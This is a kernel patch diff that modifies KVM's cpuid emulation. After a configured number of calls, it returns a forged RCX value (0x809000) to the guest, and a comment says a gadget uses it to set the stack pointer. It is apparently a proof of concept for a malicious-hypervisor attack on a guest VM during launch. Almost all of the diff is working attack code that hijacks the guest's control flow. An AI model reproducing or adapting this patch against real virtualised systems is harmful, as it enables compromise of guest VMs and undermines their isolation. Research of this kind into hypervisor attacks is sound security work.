@@ -24,6 +24,7 @@
 #include "trace.h"
 #include "pmu.h"
 
+#include <linux/launch-attack.h>
 static u32 xstate_required_size(u64 xstate_bv, bool compacted)
 {
 	int feature_bit = 0;
@@ -1065,10 +1066,25 @@ int kvm_emulate_cpuid(struct kvm_vcpu *vcpu)
 	eax = kvm_rax_read(vcpu);
 	ecx = kvm_rcx_read(vcpu);
 	kvm_cpuid(vcpu, &eax, &ebx, &ecx, &edx, true);
-	kvm_rax_write(vcpu, eax);
-	kvm_rbx_write(vcpu, ebx);
-	kvm_rcx_write(vcpu, ecx);
-	kvm_rdx_write(vcpu, edx);
+	if(launch_attack_config.current_cpuid_call_count < launch_attack_config.target_cpuid_call_count) {
+		kvm_rax_write(vcpu, eax);
+		kvm_rbx_write(vcpu, ebx);
+		kvm_rcx_write(vcpu, ecx);
+		kvm_rdx_write(vcpu, edx);
+	} else {
+		//used by gadget to write to rsp
+		kvm_rcx_write(vcpu, 0x809000);		
+		//don't care for these
+		kvm_rax_write(vcpu, eax);
+		kvm_rbx_write(vcpu, ebx);
+		kvm_rdx_write(vcpu, edx);
+	}
+
+	if( launch_attack_config.current_cpuid_call_count < 100 ) {
+		printk("cpuid call nr %d\n",launch_attack_config.current_cpuid_call_count);
+	}
+	launch_attack_config.current_cpuid_call_count++;
+	
 	return kvm_skip_emulated_instruction(vcpu);
 }
 EXPORT_SYMBOL_GPL(kvm_emulate_cpuid);
